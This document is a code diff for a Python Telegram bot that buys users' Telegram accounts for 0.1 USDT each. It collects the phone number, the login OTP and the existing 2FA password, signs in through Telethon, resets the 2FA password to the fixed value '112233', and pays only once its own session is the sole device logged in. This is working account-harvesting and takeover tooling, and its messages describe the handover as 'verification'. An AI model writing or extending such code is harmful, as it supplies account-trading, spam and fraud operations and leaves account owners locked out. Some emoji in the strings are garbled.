@@ -1,3 +1,31 @@
+"""
+✅ TELEGRAM BOT USER FLOW IMPLEMENTATION
+
+1️⃣ User Sends Phone Number
+- Bot checks: Valid format (+123...), country code exists and has capacity, number not already used
+- If valid: Sends OTP via Telethon, Bot replies: "📲 Please enter the OTP you received..."
+
+2️⃣ User Sends OTP Code  
+- Bot verifies the OTP:
+  • If 2FA is required → Bot asks: "🔒 Please enter your 2FA password"
+  • If verified → Proceeds to set and update 2FA password with "112233" and reward
+
+3️⃣ User Sends 2FA Password (if needed)
+- Bot signs in and sets/updates 2FA password to "112233"
+- Sends immediate success message:
+  ✅ Account Received
+  📞 Number: +...
+  💵 Price: 0.1 USDT  
+  ⏳ Verified automatically after: 600 seconds
+
+4️⃣ Background Reward Process (Runs in Thread)
+- Waits (claim_time - 10 seconds)
+- Validates session (only 1 device must be logged in)
+- If valid: Adds USDT reward to user, edits success message, sends final reward notification
+
+⚙️ SYSTEM COMPONENTS: Telethon, TeleBot, Threads, Session Manager
+"""
+
 import re
 import asyncio
 import threading
@@ -39,6 +67,7 @@ def handle_phone_number(message):
         user_id = message.from_user.id
         phone_number = message.text.strip()
 
+        # Bot checks: Valid format, country code exists, capacity, not already used
         if check_number_used(phone_number):
             bot.reply_to(message, "❌ This number is already used")
             return
@@ -57,13 +86,14 @@ def handle_phone_number(message):
             bot.reply_to(message, "❌ No capacity for this country")
             return
 
+        # Send OTP via Telethon
         status, result = run_async(session_manager.start_verification(user_id, phone_number))
 
         if status == "code_sent":
             reply = bot.reply_to(
                 message,
-                f"📲 OTP sent to: {phone_number}\n\n"
-                "Please reply to this message with the 6-digit code.\n"
+                f"📲 Please enter the OTP you received on: {phone_number}\n\n"
+                "Reply with the 6-digit code.\n"
                 "Type /cancel to abort.",
                 parse_mode="Markdown"
             )
@@ -80,7 +110,7 @@ def handle_phone_number(message):
 @bot.message_handler(func=lambda m: (
     m.reply_to_message and 
     any(x in m.reply_to_message.text.lower() 
-        for x in ["otp sent to", "enter the otp"])
+        for x in ["please enter the otp", "enter the otp"])
 ))
 @require_channel_membership
 def handle_otp_reply(message):
@@ -93,15 +123,17 @@ def handle_otp_reply(message):
             bot.reply_to(message, "❌ No active verification")
             return
 
+        # Bot verifies the OTP
         status, result = run_async(session_manager.verify_code(user_id, otp_code))
 
         if status == "verified_and_secured":
+            # No 2FA needed, proceed directly
             process_successful_verification(user_id, user["pending_phone"])
         elif status == "password_needed":
+            # 2FA is required
             bot.send_message(
                 user_id,
-                "🔐 This account has 2FA protection.\n"
-                "Please enter your current Telegram password:",
+                "� Please enter your 2FA password:",
                 reply_to_message_id=message.message_id
             )
         else:
@@ -117,6 +149,8 @@ def handle_2fa_password(message):
     try:
         user_id = message.from_user.id
         password = message.text.strip()
+        
+        # Bot signs in and sets 2FA password to "112233"
         status, result = run_async(session_manager.verify_password(user_id, password))
 
         if status == "verified_and_secured":
@@ -140,51 +174,75 @@ def process_successful_verification(user_id, phone_number):
             bot.send_message(user_id, "❌ Country data missing")
             return
 
+        # Finalize session and get configuration
         session_manager.finalize_session(user_id)
         claim_time = country.get("claim_time", 600)
         price = country.get("price", 0.1)
 
+        # Mark number as used
         mark_number_used(phone_number, user_id)
+        
+        # Send immediate success message
         msg = bot.send_message(
             user_id,
-            f"✅ *Verification Started*\n\n"
-            f"📱 Number: `{phone_number}`\n"
-            f"💰 Reward: `{price}` USDT\n"
-            f"⏳ Completing in: `{claim_time}` seconds",
+            f"✅ *Account Received*\n\n"
+            f"� Number: `{phone_number}`\n"
+            f"� Price: `{price}` USDT\n"
+            f"⏳ Verified automatically after: `{claim_time}` seconds",
             parse_mode="Markdown"
         )
 
+        # Add pending number record
         pending_id = add_pending_number(user_id, phone_number, price, claim_time)
 
-        def finalize_verification():
+        # Background Reward Process (Runs in Thread)
+        def background_reward_process():
             try:
-                time.sleep(max(10, claim_time - 10))  # Minimum 10 sec buffer
+                # Wait (claim_time - 10 seconds)
+                wait_time = max(10, claim_time - 10)
+                time.sleep(wait_time)
                 
+                # Validate session (only 1 device must be logged in)
                 valid, reason = session_manager.validate_session_before_reward(phone_number)
                 if not valid:
-                    bot.send_message(user_id, f"❌ Failed: {reason}")
+                    bot.edit_message_text(
+                        f"❌ *Verification Failed*\n\n"
+                        f"📞 Number: `{phone_number}`\n"
+                        f"❌ Reason: {reason}",
+                        user_id,
+                        msg.message_id,
+                        parse_mode="Markdown"
+                    )
                     return
 
+                # If valid: Add USDT reward to user
                 update_pending_number_status(pending_id, "success")
+                current_balance = user.get("balance", 0)
+                new_balance = current_balance + price
+                
                 update_user(user_id, {
-                    "balance": (user.get("balance", 0) + price),
+                    "balance": new_balance,
                     "sent_accounts": (user.get("sent_accounts", 0) + 1),
                     "pending_phone": None,
                     "otp_msg_id": None
                 })
 
+                # Edit success message and send final reward notification
                 bot.edit_message_text(
                     f"🎉 *Successfully Verified!*\n\n"
                     f"📞 Number: `{phone_number}`\n"
-                    f"💰 Earned: `{price}` USDT",
-                    message.chat.id,
+                    f"💰 Earned: `{price}` USDT\n"
+                    f"💳 New Balance: `{new_balance}` USDT",
+                    user_id,
                     msg.message_id,
                     parse_mode="Markdown"
                 )
+                
             except Exception as e:
-                print(f"Reward Error: {str(e)}")
+                print(f"Background Reward Process Error: {str(e)}")
 
-        threading.Thread(target=finalize_verification, daemon=True).start()
+        # Start background thread
+        threading.Thread(target=background_reward_process, daemon=True).start()
 
     except Exception as e:
         bot.send_message(user_id, f"⚠️ Processing error: {str(e)}")
